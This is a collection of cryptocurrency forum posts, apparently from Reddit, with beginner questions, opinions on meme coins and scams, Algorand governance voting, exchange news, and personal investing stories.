I am relatively new to the crypto currency scene. I started buying BTC in January, then added some XLM. Each month splitting my fiat about 2:1 BTC:XLM. This past month I started expanding my positions into ETH and ALGO. I don't have a ton of money to put into this each month so I don't want to spread myself too thin. Currently my portfolio is about 63% BTC, 25% XLM, 10% ETH, and 2% ALGO. My plan is to increase ETH and ALGO to an equal position to BTC and then DCA into all three on an equal basis. While I like the use case for XLM, the position feels very stagnant compared to most others. Is it worth holding onto or better to sell and rebalance into ETH and/or ALGO?

So I am sure this question. Pops up every so often, for that I apologize. I am interested in crypto currency and have only just started to truly research what mining would entail. 

From what I have gathered you start by getting a virtual wallet (check), buy a rig (was looking at the antminer L3 due to price ~1300usd) makes according to calculator around 4.50 a day, i am not sure if I need to sign up with a mining group or if this miner would be more profitable on its own?  Finally mine coin until ROI which would be about 6 months according to calculator. At which point I keep my coins, exchange them for other coins or go to an exchange that will cash them out for usd. Am I missing anything? 

This seems incredibly easy which is what scares the crap out of me. I would love to help pay off my house and student loans quicker but I am worried about scams (I understand the risk of a rising and falling coin market, but don't want to get a machine that does nothing or says it will make me 4.50 a day but really just costs me money). I know that is a lot to unpack I am very appreciative for any info advice.

Might be unpopular but Im already sick of seeing the rise of the shitcoins and all the news surrounding them. I hope the market crashes so we dont get regulated here in the USA by a bunch of old senators that think that all crypto is just gambling on different dog coins. 

Im tired of the expected rug pulls, pump and dumps, etc that are pretty obvious reasons not to go all in on them. Not sure why they arent just called casino coins or something since its just pure gambling. 

Im invested in crypto for the long term. Im not stupid enough to know that theres money to be made and lost in shit coins but I just cant bring myself to hold a coin that has literally no value other than it being a meme.

To preface I think we can all agree crypto is still in its early stages(based on mass adoption). Furthermore, I truly believe that in a vacuum, blockchain and its subsequent technologies are the future of transactions. 

So I have a question for everyone here. 
What do you think is in the way of mass adoption of cryptocurrency? What hurdles does it need to overcome to supplant fiat currency?

Personally I see central banking interests as a potential hurdle. Will regulation efforts change the course or put a damper on the appeal of cryptos?Can governments really do anything to stop it? 

Curious to hear everyones perspective on this. Whether you disagree about cryptos potential or what you foresee in the future, short or long term.

(Not opposed to thoughts about price trends as well)

Crypter is the name of the project.  Ladies and gentlemen. Its platform is for social media enthusiasts to link up. Once website goes live, you get rewarded for engagement. Currently for holding, instead of reflections, you are rewarded with BUSD based on your holding.

 The future path for social networking among us cryptocurrency users. Just the beginning, this is just a huge step to expand the sight on this space. Once the network mainstreams in OUR space, it will begin leaking into the mainstream public not as familiar with what it is and why we invest in crypto. Im legit hyped for this project, the developers have been working hard on the project. The community is growing, the beta website is improving daily. Not here to tell you to invest. This is a great opportunity for those of you unaware of it to check it out.

###The votes been neck and neck alday then suddenly BANG , whats your thoughts 

###See below the voting options for those unfamiliar with governance



Governors should decide between the following two options:

Option A: Keeping the current system. The Governance rewards amount for 2022 will be 282M Algos (70.5M per quarter) while maintaining the current simple locking mechanism: the rewards are distributed among the governors who vote and maintain the committed Algos in their wallet for the entire quarterly period. Governors failing to do so will lose their rewards, but will incur no further penalties.

Option B: Higher rewards and slashing. The Governance rewards amount for 2022 will be 362M Algos (90.5M per quarter) with a slashing mechanism: the rewards are distributed among the governors who vote and maintain the committed Algos in their wallet for the entire quarterly period. In case of failing to do so, Governors will be subject to an 8% slashing of their committed amount, on top of losing their rewards. The penalties that non-compliant governors pay will be returned to the global rewards pool in the AERP, to be used for future rewards

The Squid Game fiasco has brought shitcoin scams to the spotlight once more and it is important to raise awareness about scams. Specially in the case of Squid Game, that simply did not allow wallets (other than a few whitelisted ones) to sell them.

However, we all know there are new meme shitcoins coins popping up everyday, which are obviously without a use case or clear pump and dump schemes.

My contention is that, as long as you know this is pure gambling, that you shouldn't spend important money on it, and you are honest to other people about it, there is no real problem in trading them.

Humans like to gamble and these shitcoins are just the latest iteration of the slot-machine. I think most of the crypto-space by now is quite aware that most of these dog or Elon related coins are shitcoins. But we are also aware that they can be somewhat fun with all the volatility.

As long as we raise awareness about these aspects of shitcoins, the damage they do to new investors (just like we already do to real gambling and recreational drugs) could be reasonably contained.

Peace.

Sorry if this has been posted before, but I looked through everything and cant find specifics, which is what I am curious about.

Say you get in on a coin before the main stream media gets wind, basically any of the recent ones that have just blown up. Usually what precipitates a blow up is the coins addition to major platforms like Coinbase, Robinhood, etc. 

How do you cash out? Your $1000 dollar investment is now worth 10 Million (whatever, made up numbers), so now what? Your coins are probably in whatever wallet you use. Do you just transfer and cash out?

Pulled from telegram. 

Larry:

Will fees on your chain be adjusted if and when sys token increases in price?

Keyare(dev):

Currently, and probably into the next five years we dont plan on adjusting the price because Syscoin would need to do a 800,000x the current price to have Ethereums tx fee issues. On top of that, on the NEVM chain with ZKrollups there is the possibility of FEELESS transactions.

Larry:

If there is going to be a feeless transaction, that means sys token will not be needed to pay transaction fee on the NEVM chain, if that's so, what will be the essence of holding or buying sys token?

Jag(dev):

You would pay in spending token, Rollup still needs to pay sys fee to transition rollup state on layer 1.

Larry:

If I can perform a FEELESS transaction on your chain, what is the need of holding or buying your SYS token? I just don't understand

Jag:

Its gasless not feelless. Mute guys are making feelless to start but long term it will be gasless only. 

Larry:

I understand how L2 like matic, fantom, avax etc work, you need the token of this L2 to carry out transaction on their chain.

I thought they are use interchangeably when talking about on-chain transaction?

Jag:

No zkrollups are new and more interesting than sidechain. Gas not required for user but required for rollup to transition state. Fee required for user but can be paid in any way the provider wants. 

Larry:

Is there a DEX that is building on NEVM chain right now?

Jag:

Yes, Focus in on l2 mostly

Larry:

Good, let me get enough sys token right now that it is still cheap to pay for gas fee when I start using those project build on NEVM chain.

Jag:

Sys will be used everywhere in daos and defi etc like how eth is

Larry:

Great, now I got it clearer. What is the minimum amount of SYS token required to participate in DAOs?

Jag:

market is not defined yet, since its not released yet. it is eip1559 though. 

we will try to bring all volume to L2 befor mass onboarding but i think maybe some projects will launch directly on L1.. gas won't be an issue to start either way

Larry:

Will SYS token become deflationary over time by burning part of SYS token use for transaction fee just as Ethereum is doing right now and Binance want to start same too?

Jag:

The goal is to serve financial system for that you need the ultimate design and utility ethics for the base currency that is what I am implying when I say we will try to push for l2 adoption this will enable more scale and keep providers happy bringing a cycle of integrations which will not hit bottlenecks like other designs

Larry:

Will NEVM chain be a probabilistic finality or fast finality?

Jag:

gauranteed finality after a chainlock

Larry:

"After a chainlock" in other words, transaction may not be instant?

Jag:

on L1 or L2? on L1 blocks are more important on L2 it depends on the rollup implementation zksync for example has a sequencer that garuantees your spot in the queue and slashing if they do not include those txs, others might be centralized zkp provider that just ends up giving receipt and it can be thought of as instant not gauranteed though as provider can not include it for some reason. for user experience though if provider accepts the tx you can thnk of it as instant basically

Aside from giving Algo holders a voice in the running of Algorand, the biggest benefit of governance is the organic conversations its created about Algorand. I see tons of (mostly) healthy debate going on here and Algo subreddits. But it doesn't stop there. Look on Twitter and you'll see lots of back and forth -- people talking about voting A or B, but more importantly it's going to make others curious about Algo. Youtube -- same. You'll see video after video talking about this stuff. 

I'm an Algo supporter, so I love to see all this. Hoping it leads to more organic adoption -- people not getting in for a quick profit but support of the Algo ecosystem and ASAs by extension. Lots of good shit to come!

Binance announced just a few hours ago that it has now added a trading pair between the "meme coins" dogecoin (DOGE) and shiba inu (SHIB) on the trading platform:

&amp;#x200B;

https://preview.redd.it/p0l162cqu0x71.png?width=503&amp;format=png&amp;auto=webp&amp;s=4b84082358794ed44dc50169a8eabe336e373504

Dogecoin and shiba, meanwhile, are in a battle with each other. SHIB rose so much recently that it even overtook dogecoin in terms of market capitalization. Also today, the SHIB price is up 20% again.

&amp;#x200B;

So I'm really wondering who they added this functionality for, as Doge holders and Shib holder do not seem to be fans of each other and I doubt that anyone is trading their SHIB for Doge (or the vice versa) anytime soon

Just for the fun of it, if the entire crypto market was a chess board game, no doubt Bitcoin would be represented by the king. I mean, It's the tallest and more powerful piece on the board, even if it moves slowly in any direction. We all know without no doubt, that if Satoshi would come out of the shadows and rug pull on us, it will be the equivalent as folding the king in a middle of a game... 

But what about the other coins versus the others pieces? Who would represent the queen or pawns? 

A pawn has a small chance to become a queen someday, right?
Who would help the king castling? 

I'm curious to see your answers, nothing serious here, just play by the chess rules...

Document here: [https://research.bloomberg.com/pub/res/d37g1Q1hEhBkiRCu\_ruMdMsbc0A](https://research.bloomberg.com/pub/res/d37g1Q1hEhBkiRCu_ruMdMsbc0A)

Some interesting comments that piqued my interest:

&amp;#x200B;

* "We estimate the amount of cryptoasset market value needed to support economic activities to expand from \~$500B next year to **$3.6T in 2028**"
*  "90%+ of cryptoasset value will be derived from penetration of offshore deposits in the next decade"
* "Currency and Privacy networks will be the largest beneficiaries, as most fundamental value will stem from **store of value use cases** "
* "Upside (5-yr) In **BTC ($96k)**, **XMR ($18k)**, and DCR ($535), cryptoassets which apply unique value propositions within deep and viral markets "
* "Downside in BCH ($268), and cryptoassets which attempt to inherit brand recognition and provide minimal technological advantage to incumbents" 
* "Little value in XRP ($0.01), and cryptoassets which are misleadingly marketed, not needed within their own network, and have centralized ownership/validation "
* "Most "Other Utility" application-specific networks hold very little value, in their current construct"

&amp;#x200B;

Some things seem pretty close, like overall market valuation and bitcoin's price.

Other things, like XMR/Monero going to $18k, are starting to look way off.

I think this article is a fascinating way to review how our understanding of crypto markets and technology evolves overtime.

Bonus points if anyone knows if there is a current version of this report available.

Binance, the world's largest cryptocurrency exchange, has temporarily halted all withdrawals for cryptocurrencies. The company has just announced this via Twitter:

&amp;#x200B;

&amp;#x200B;

At first, that seemed to be short-lived. After about 20 minutes, the problems seemed to be solved when Binance announced that withdrawals were possible again. However, 20 minutes later things were locked down again:

&amp;#x200B;

&amp;#x200B;

However, it is unclear what exactly is going on at Binance and what the crypto exchange means by this "large backlog."

&amp;#x200B;

The news is accompanied by a large outflow of crypto from exchanges. For example, there has been a spike in the amount of Ethereum (ETH) leaving exchanges, reports Ki Young Ju, CEO of analysis firm CryptoQuant. It may be a sign of "retail FOMO" and could work out well for prices:

I hope you guys live for a 100 years and enjoy everything this world has to offer and die like how tyrion wanted to die. But in case if something were to happen to you, make sure your family gets all your crypto.

Tons of crypto has been lost forever because no one can access it. Most of us are in crypto space cause we want to become rich and live a peaceful and financial independent life with our family. 

In my case I've written my security keys/ seed phrases, everything from what it is and how to access my wallet in steps in my diary. If I were to die, my brother is instructed to open that diary (I trust him the most).

There are tons of ways you can make sure that all your crypto reaches your family. One are the traditional ways of hiding in house. Or you could give them to your lawyer. Or keep it in safe of a bank.

I read something about proton mail. It send your beneficiary (someone you trust) all details if no one accesses the account. Also it is not like Gmail. It's from Switzerland, so i think it might be safe. I do not have much knowledge on this one but do check it out!

I may have missed somethings, or be wrong about something.  Do share how do you guys plan to make sure your crypto reaches your family?

Attempted to post a screenshot of an email that I just received from Celsius Network. It read as follows: 

We are reaching out to you with an update regarding a cease-and-desist order issued by the New Jersey Bureau of Securities to Celsius. We are one of several crypto companies in recent months to receive such an order.
 
We are disappointed these actions have been filed and wholeheartedly disagree with the allegations being made. Celsius is committed to regulatory compliance and we look forward to resolving this matter as quickly as possible. 
 
Following an extension granted by the Bureau to allow Celsius to continue discussions with the regulator, the order will take effect on December 10, 2021. We continue to have discussions with the regulator and will update you regarding any developments.
 
This order does not affect funds in existing accounts of users residing in NJ or elsewhere. You can continue to earn rewards and use our services, and withdraw your funds at any time without any fees.
 
Thank you to the entire Celsius community for your incredible and ongoing support. We remain fully committed to our founding vision of bringing financial freedom to the world. Celsius continues to charge ahead with passion and purpose.

Still I would rather have this happen from time to time then rush into things without making sound research. Day to day trading is a spin at the wheel but long term investments have long term success with reduced risk. As frustrating as something like this is, by spending additional time and letting short term gains slip away I can soundly invest real savings as opposed to casino money

Hello there!

So let me get straight to the point. I am looking for a good guide or an explanation or any advice really on how to transfer my Bricks to my MetaMask and then sell them. The current tutorials I have seen have not worked for me and after making a few small transactions to see if the Bricks would get sent to my MetaMask accounts it did not work and the Bricks were most likely lost in the process.

I am reaching out here since I know people on here know their crap and I am rather inexperienced in this type of thing and am just looking for a way to not get scammed as the prices the Vendors of said currency give are approximately 10 times lower than the actual price of the Token.

Anywho if anyone could provide me with any information, guide link or advice I would greatly appreciate it as I am lost on what the hell am I supposed to do know. I just wanna see if I can make some money from the currency and that's all that there is to eh.

Thank you and have a great day.

I first got involved with crypto in April of this year when Doge launched to .70. Yes, I FOMOd in near the top. Yes, I still hold a bag of Doge. Its not the same Doge I bought at first and I am green on it. 

But this isnt about Doge, this is about rent. I cant buy a house right now, even though Ive been a homeowner before. I bought a house in 2007 right as the housing bubble was blowing up. 

I dont own that house anymore, and now owning a house is back to pie in the sky territory, thanks to the fucking vultures squeezing normal human beings out of the market. 

But I just paid my rent in crypto, and got paid over $50 to do it. That $50 will be turned into ETH after it clears, and it will be added to my house fund. 

I figure when I have 32 ETH, I can take my pick of houses. 

Until then, its back to the fiat mines for me.

Ladies and Gentleman, the race to 1,000,000 Moons is over!

Until recently the only account that has ever had 1M+ Moons was u/TheMoonDistributor, which isn't a "real" user, but rather a holding account for the mods to use for various purposes.

However last week that changed as u/SamZFury eclipsed the 1M Moon mark! An even more notable achievement since they aren't one of the Mods. (For those wondering, yes I asked permission before posting this, samzfury seems like a nice guy/gal)

The breakdown of Moon holders (among Redditors) is shown below. If you have &gt;= 500 Moons you are in the top \~8.5%!

TL;DR: u/SamZFury make sure to backup your vault

1. **If it sounds too good to be true, it probably isn't.**

Since we are in a bull run and so many people made a killing by investing in meme coins, it is very likely for new investors to get lured into any new coin. The same thing happened with the Squid game token. Greed got the better of so many new investors.

2. **DYOR - Do Your Own Research**

I can't stress enough the importance of doing your own research before investing in crypto. It is your money, after all, and only you are responsible for your failures. So, always research the team, project and its application before investing in cryptos.
White paper of Squid game token was screaming of it being a shitcoin by mentioning its "Anti-dump mechanism."

3. **Beware of FOMO**

Getting into a particular token or coin after it gets pumped without any reason is a big red flag sign.

4. **Always invest in projects with solid teams and roadmaps.**

Not every coin will make you rich, and if you think so, don't cry after the rug pull.

This is rather a noob opinion question, however Im curious as to what responses Ill get. When you are staking crypto, and you have a couple coins you are completely sold on, does it make sense to hold powder in the keg and wait for a dip? Would it make more sense to just vest it all and collect the staking rewards on coins you plan on HODLing? Seeing that no one can see the future in this extremely volatile crypto landscape, this would cause a larger stack to help grow itself faster. I am just curious as to what the general consensus is in this sub, as ai have learned volumes just from lurking in here for week. Any replies would be greatly appreciated. Thanks again.

I first bought ETH in 2017 because the actual real world use seemed to make sense to me (sadly I sold it at $400). in 2020/2021 I bought ADA, ETH, and XLM because again the real world use seemed to make sense to me and I could see them lasting a long time. I have since added ANKR, ALGO, and BTC because I could understand how they will be used in the real world. I decided that was enough crypto for me and I would just DCA into them without adding anything else. 

Now I am finding that many applications I am using keep running on the Polygon blockchain. I finally have decided to stop ignoring how much I see Polygon being used in the real world and have finally decided to add another crypto to DCA into. I would encourage anyone who isn't investing into MATIC to really give it a good look and consider investing in it. I still fell like it is relatively cheap and early at only about $10B market cap.

Is it better to research a small number of or even only 1 coin and put all your investment into that or invest in multiple different coins?

Was just thinking about this in more detail lately.  Unlike stock markets, I think we can agree that cryptocurrencies all behave pretty similarly. So really having multiple coins can't be called diversifying in the same way as say, ETFs for example. 

So I have like 20+ different coins,  and am thinking this could be too much. Having so many increases the chances at least one will 'go bust' and looking at historic top cryptos, it seems like it's always a changing space.  So having so many am I not pretty much guaranteeing my that most will fall and I'll be left with large gains in only a small fraction of my investment. And that's if I'm lucky.

... maybe it's better to choose around 3 or 4 coins and go 25% in each??

Interested in other people's thoughts.

Just watched a video covering SHIB's situation. A certain coin came to light to me when the video showcased how many other dog projects are flooding the market. The solana based coin has actually the same dog breed that me and my so have. So as a human being i FOMO'd a 1000 on it. And i intent to dca if it manages to drop. I felt dumb with this market when meme coins just rice and actual tech is being ignored but i feel like i want to be in that meme party too in my own way. The same dog breed that i love and care for has it's own coin and maybe i lose with my rash investment. Maybe i win, im taking a higher risk than investing into other more stable coins. Happy holding with these doggy moneys. May it bring some treats.

Let he who is without sin cast the first stone, as they say.

Can all of you tell me, honestly, that you've read the whitepaper of every single coin you hold/held? Because I couldn't say that. I've read ALGO's and CKB's, but not LINK's or DOT's. I know what they're about, of course, I've done my research, but I've never read the whitepapers themselves.

Of course, Squid was sus from the beginning and people should've really done *some* research before jumping into it, but can you guys say you've read whitepapers before? I'm curious.

On the front page is a post about someone who has made a significant chunk of profit on crypto (good for them!), and they are unsure about telling their SO who they have been with 3 years if they are in profit. WTF?

&gt; The reason why I havent told her; she is the arbiter of paychecks. Her financial responsibility is similar to if you handed a 9 year old your life savings and sent them into Toys R Us unattended. Money spending and savings is just about the only issue of contention between us. If I showed her the account, Im afraid of the conversation that would follow. 

This part is fucking weird, the way you talk about your partner? And the comments reek of virgin neckbeards, seriously.

Crypto is a MEANS TO AN END, either through making money through fiat or for when it becomes established as a fiat replacement, why the fuck are you with you with someone for **THREE** years who you obviously don't trust &amp; can't talk to about important financial decisions. One of the biggest contributor for divorces/breakups in long term relationships is money issues &amp; communication regarding money.

Please don't get all consumed by crypto that you are fucking lying to your life partner.

&amp;#x200B;

This sub is fucking pathetic sometimes.

I've seen this sentiment in comments regarding every single "problem" that is highlighted by news posts or opinion pieces here in this subreddit. Like the faults of certain economies or the US inflation or... well, anything else that might be going wrong in the world and that is even slightly related to crypto.

And the comments (at least the first wave) always seem to be the same thing.

"Crypto can fix this!"

We're all big on crypto and its possibilities, that's why we're here, but let's try to remember the limitations it has and not just praise it endlessly like a cult and offer it as a solution to literally everything, from inflation to world hunger to curing cancer.

As a small example with the US inflation thing, how exactly would crypto be able to "solve" that, other than give a certain number of people a way out of dealing with it while others inevitably suffer the effects nonetheless? Remember, crypto is a zero sum game in some regards. 

All this to say, let's be unbiased and not see crypto as the thing that will fix every single problem in the world. It's a good thing, undoubtedly. But it's not a cure-all.

With meme coins and some of their shittier cousins rising, I've been seeing a lot of people getting super salty towards people who hold these coins. And frankly it goes the same the other way around. That's plain stupid. We all came here to get a better chance at living our lives like we want, to be financially independent, to be able to leave something for our kids after we are gone...Are memecoins crypto? Of course!  So let people who think it's a good decision to buy, buy them.  Eventually those very people will start coming to more meaningful projects. I've seen it happen many times. Hell, Im one of those people. 

 It takes time for people to realize how massive opportunity crypto really is. It really doesn't matter if you invest in the top 10 or a random token that you believe in. It's the community and adoption that really matters and we are in it together.

I honestly and frankly wish all your coins take off like me on the toilet after a doner kebab. 

&amp;#x200B;

Have a good one my best people and be nice to each other, we are here with one goal in mind. Get wealthier or get rugged trying.

I started crypto with about a few hundred dollars in 2017. Market crashed later, but I managed to scrape out some profit. Still, I had tons of bills, so I put those profit into paying them.

I started from scratch this market cycle due to the Pandemic, and very slowly making some profit that some of you would consider chump change. The plan is to save as much as I can, take some profit, and lock those funds away for the next cycle. I haven't bought any luxury items this whole year.

I finally have some hope. I'm not rich, but having hope for the future puts me on a path towards being rich. I still work 3 jobs, but it's a sacrifice I need to make for the future. No way I could do this rat race for another 20 years.

I'm holding a bit of shib (not much) but I really don't know what its projections are atm. I'm debating whether to exchange for cryptos like ALGO/ATOM where I can begin staking and earning from it. What do you guys think? Would it be more sensible to hold SHIB just in case something *does* happen, or ditch it for something less meme-y and 'artificially hyped'? 

P.S - if this sounds like the ramblings of a clueless wanker, then it's because I very much am one. Just trying to find my way in this bewildering new realm. Thanks for your help/time!

First off, I want to mention some others that do TA say we are dealing with a double top. This is somewhat true and this is an extremely important time we are in. But there isn't much evidence to any showing we will hit something like $45k. The evidence looks to be extremely bullish. **And hopefully this gives you your daily dose of hopium** 

Anyways, I will be using the following chart.

&amp;#x200B;

https://preview.redd.it/dvcgksh9j0x71.png?width=1946&amp;format=png&amp;auto=webp&amp;s=a00ce03ea983cb21ee25718db6870a9291eacf9a

In a nutshell it looks like we are in a flag pattern. And what is interesting is I'm seeing this on a few coins at the same time. Based on this I can't give a date, but it looks like we will end up having a jump over a few weeks to a month to $80k-$85k. Now I expect some pull back when we get into that range, but unless if we completely drop I expect us to stay within $75k-$90k. 

The current projection of things is when we cross $90k and stay above $90k we will have a massive jump to our peak. This jump will highly depending on the momentum. So if it lands at $120k-$150k-$200k or whatever depends on when the momentum ends. It's too far out right now to say much more on this. But I am expecting this to happen mid to late next month. We will be able to tell more the closer we get to next month.

BIG THING TO NOTE: If you're like me and want to hold long term. It's hard to say where the dip after the peak will be. But I'm thinking we are near that area or under that area. Meaning if I was someone looking at holding this long term and wanting to jump in. I wouldn't wait much longer. While this jump the chart is showing should happen over half a month to a month. It will be extremely easy to miss it. But if I was swing trading I would wait a few days or so. But note that is just me.

&amp;#x200B;

Anyways, looking at other factors. If we look at fear and greed. [https://alternative.me/crypto/fear-and-greed-index/](https://alternative.me/crypto/fear-and-greed-index/) We are looking at a 74 rating. Note this is good news for holders.

Looking at crypto heatmap [https://coinmarketcap.com/crypto-heatmap/](https://coinmarketcap.com/crypto-heatmap/) it looks like we are on an up date. Not by much, but we are looking at the trend of things.

&amp;#x200B;

Note I'm not a financial advisor.

For the past month or two the active members on this sub usually fluctuated between 10-28K at a given time. So I was completely surprised to find out it is up now to about 40K. To all those that took a hiatus during the dip in May welcome back. I hope life has been treating you good. 

Theres a lot of good things ahead and it looks like were going to be seeing new ATHs for a lot of our favourite Cryptos. So the next coming months should be really good. Dont forget to get some exercise, drink water, and take some profits. Happy browsing r/CC

As a developer, I've been looking to dabble with NFTs, and with the recent hype around them in many spaces this interest of mine has only increased. But, beyond just using a platform like Enjin, OpenSea, or Solsea to mint picture NFTs, I wanted to create something on my own using actual code.

I've given the Algorand docs a skim, as I found them extremely intuitive, and I'm familiar with Python which has made the code examples far easier than attempting to learn Rust or Solidity at the same time as understanding blockchain fundamentals. From what I could gather, an NFT can be minted as simply as through their SDK by anyone with some ALGO in their wallet and sending a transaction to the blockchain.

This is where I frankly get a bit confused. Don't NFTs get minted by smart contracts? Allowing users to see precisely what kind of logic is built into the smart contract to ensure no duplicates are created, etc? From my limited reading on Algorand this doesn't seem to be the case. Or does Algorand just allow this as an option for a centralized version of NFTs and in that case is there a way to mint them on-chain?

My second question is around the metadata. Again, most of my knowledge is coming from the Algorand docs, but it seems an NFT will have its data embedded on-chain. Which makes sense, but does that mean for images there's some kind of standard in a key-value kind of pair? In the case of Algorand there's also a way to provide a metadata URL, which I suppose could be a link to the image, but that would forward the user to a centralized server which obviously makes little sense in the context of crypto. 

So how exactly do NFTs work under the hood? Code examples would make this a lot easier for me to understand. I'd prefer sticking to the Algorand-Python example, but Javascript, Golang, etc. work, too. Anything that can get me a bit further is much appreciated. Thanks in advance!

Longtime GME holder and crypto enthusiast here. For those that aren't aware, last week there was a leak on Github that seems to prove that GME and Loopring are indeed working together to launch an NFT exchange.

For those that aren't in the loop (pun intended), LRC is currently exploding in price. I suspect it's a wave of people who, like myself, have just recently connected the dots in understanding what a NFT platform hosted by Loopring in partnership with GameStop would mean for LRC.

It looks like loopring can't make any official announcements until GameStop does, but they've told their followers to expect an announcement in Q4 of this year, so it should definitely happen sometime soon.

Hey guys, Im super new to cryptocurrency and have been casually investing in it for about a year and a half now. Lately, Ive been really into understanding it more and browsing more and more coins to invest in.

I had a question and I just wanted to see what some more experienced traders thought. The American Rescue Plan includes a new tax code that takes effect on January 1st that will tax transactions on PayPal, Venmo, etc. when totaling over $600. The cap used to be $20,000  this is a HUGE change in how money is exchanged and *seemingly* will effect more everyday, working class people in America.

Do you think crypto currency is going to have a major uptick by being a decentralized trading means for everyday people? Could a new app come out months after the new code that looks to target Americans who are looking for Venmo alternatives? I suppose Im not 100% sure on how this platform would function, but Id imagine it would simplify having a crypto wallet, and make crypto trading more sociable and user friendly between two parties.

With my little understanding of crypto currency, heres how I see things rolling out: Americans react to this super low cap of taxable money trading and they begin diving into crypto currency. These people maybe arent the most interested in investing or carrying crypto for the reasons that experiences traders do so tons of new people look for ways to trade a decentralized currency in hopes to avoid this new tax code. These people are looking for the easiest, simplest way to adopt crypto in order to trade for quick transactions with friends or small businesses. I could see this as being a major catalyst for a cryptocurrency boom coming up. If the market is hot with a new coin for a trading service  lets call it a Cash App Coin for an example, it would lead to more people becoming interesting in other crypto services and potentially help everyone investing now. 

I think Im going to go a little heavy on some coins Ive been invested in for awhile and see how it all shakes out. What do you guys think?

Edit: I see the subs Tax Laws rules and I do not believe this post violates them, but I do understand if it is flagged or needs to be changed. I do not mean to suggest anyone should commit tax evasion that breaks any countrys tax laws.

Is it not funny how some are depicting crypto currencies as something that is made for illegal activities.

Ok yes, there is a lot of stories like the silk road. But what are we comparing it to? 

What have criminals, drug/alcohol smuggler, drug trafficker, cartels, gangs, mafias have been using for generations ? 

Physical money is the form of payment that is and have been the mostly used for illegal activities... who would want to sell drug using a currency that can be traced for eternity...

This big narrative doesn't make any sense...

So in my short time in crypto, it seems like rug pulls and other shady tactics are a regular thing in this world. 

Ive spent a lot of time researching various projects and in general, there is a world of difference in the quality of large cap projects vs the smaller tokens Ive look at. 

While I know potential returns are smaller, for those of you more experienced, do you think sticking to these larger cap projects is a good way to avoid these scams? I mean I still plan to do research but I also am concerned that if I attempt to mess with low cap projects I will end getting caught in a scam.

When I purchased dogecoin it was on binance us because it wasn't present on coinbase.

I have some little coins on binance us, but I'm wondering if, for the coins that are listed on both, I should move them to coinbase.  Is coinbase safer?  I feel like binance keeps having some shady news stories popping up and if something happens I want me tokens accessible.

Or does it not really matter?

I know Binance us has some stuff available that coinbase doesn't, I just want to know for a US citizen, which is the better option.

Have you ever seen those funny posts on buzz feed or Facebook where someone orders a pillow or coffee table because its the cheapest and it arrives miniature size because no one noticed Dollhouse in the title? 

I highly doubt those did noticeable damage to amazon. The people writing bad press about the crypto community were going to anyway. 

Since when is ignoring the description not a user error? I check the measurements on my Amazon purchases and I read the descriptions, shit like this makes for smarter buyers  maybe people will stop buying random shit because its *new and cheap*.

"455 player dies... One takes all the liquidity."

Say what you say about it (A scam) but the similarities of the show and the coin are just all over the place

You knew the rules of the game before playing in the show.

The white paper of the Coin clearly states every detail.

You cannot quit the games once it started.

You cannot sell the coin once you buy.

455 player dies, only one takes all the profit.

Millions of people bought, only one kept the profit.

Hopefully this would give a great example that how easy for a developer to rug pull a project, and people would start Investing in legit projects.

Greetings r/CryptoCurrency. It's a new month and this means a new Cointest round has begun. 

As a reminder: the **r\/CryptoCurrency Cointest** is an official, ongoing competition for crowdsourcing the best arguments in support of or against crypto topics by awarding Moon prizes to the winning contestants. The end goal is to provide r\/CC readers with a balanced source of quality information for their cryptocurrency research.

EDIT: For more info, please read our [policy page](https://old.reddit.com/r/CointestOfficial/wiki/cointest_policy).

### Changes

You might be wondering what this thread is all about. The Cointest team is introducing a big change to how we will be organizing the contest going forward. We created a new subreddit called r/CointestOfficial. In this sub, we will post new topic-threads and link to them in monthly awareness posts like this one. The major benefit here is we no longer need to spam r/CryptoCurrency with 20 new topic-threads at the beginning of every month. 

Other benefits are:

 1. This new arrangement lets people subscribe to the contest and find out on their front page when new topic-threads are posted.

 2. The rules and guidelines visible in the sidebar. 

 3. The administrator team has greater control since most managerial tasks are now consolidated within the new subreddit. Admins can approve filtered arguments, pin meta or recruiting threads, more easily edit wiki pages, etc. 

### Coin Inquiries Topic-Threads

We've also changed the topics available, so if you're a ALGO, IOTA, XMR, Moons, NANO, MATIC, ATOM, LINK, or BAT fan, we've got you covered! Please check out the list of new topic-threads below:

hello everyone. im fairly new in the crypto world and am currently trying to figure out how selling my cryptocurrency works. 
i just sold some crypto on crypto.com by pressing the sell button underneath said cryptocurrency. i received an email stating that my sell request has been confirmed, yet i have to clue where the money went. 
the email also says that i may log into the crypto wallet app and check the details. im assuming that they mean the Crypto.com app, right? or do they mean the DeFi Wallet?

either way, my biggest question is: will the money, that i should receive from selling the crypto, be sent directly to my bank account or do i have to retrieve it from a wallet?
thanks for the help! 

if this is the wrong place to be posting this question, ill remove it

I never really thought much about it, but I think hiding your tokens within MetaMask is probably a good idea. You can always un-hide them. If you click on the token and click the three dots in the upper right the option is there to hide. My thought is of course if someone hacks your wallet, they won't know what you have. Of course they will go for ETH and such, but if you have it stacked to a stacked ETH token and others of course this is a good security measure. How effective would it be, I don't know but maybe some of you could elaborate if this would help?

Some days it hits me that I am way too low on money   I'm in NY 30's and still can't figure out the money making part of my life. 

I've thought of learning a trade as a potential alternative to fields that require deep text book smarts like math and science and expensive college but could never find something to try. 

I dedicate a lot of my life to electronic music too- but as of now I only make a handful of extra money from that. It's super hard and risky to hedge my bets on making a living from it. 

I've even considered truck driving which apparently pays well but I've hard it can be a super rough field to work on. 

With all that said, I'm ears. Would love some decent ideas if anyone has any- on what to do for money for life and to be able to invest more in crypto. 

Thanks!

I came across a lot of comments like that from all sorts of retail investors that we have here. How arrogant is that?  

There are thousands of crypto projects out there and the only assets that thank me later logic should apply to are BTC and ETH. 

**BTC** is time proven, every single rich person want it, every single corporation want it, governments all around the world want it. Even China want it. 

**ETH** carries all the other stuff that we have in crypto, and even though there are many projects (L1 solutions) claiming to be better - its still a long way to go to prove that.

If Plan Bs prediction for November/December will be right and **BTC will go to 135k**, then every single shit coin will pump like mad. Same happened in may, same happened in 2017 and same will happen this time. 

**Keep your mind cold and remember that it does not require any skills at all to pick the right coins when the whole market tanks.** And when market will tank, there will be a lot of people claiming that they found next hidden gem, next BTC/ETH and next x100 coin. 

DYOR, hodl and stay safe ya all!

What do you think? Personally I feel like as more and more countries and people start adopting Crypto, it might not be a bad idea to have something like this at hand and easily accesible so that newbies can learn.

Now yes, DYOR is important, but so much information is scattered all throughout the internet, and if crypto really is going to become something for everyone, then I believe such a resource is vital. Crypto won't be niche and hard to understand for much longer, we need this if we want it to be adopted by people.

Stuff like common crypto terminology, how blockchain works, the most important and famous coins around and how they function, their pros and cons, etc. I really think a single place with all that information could help crypto grow significantly.

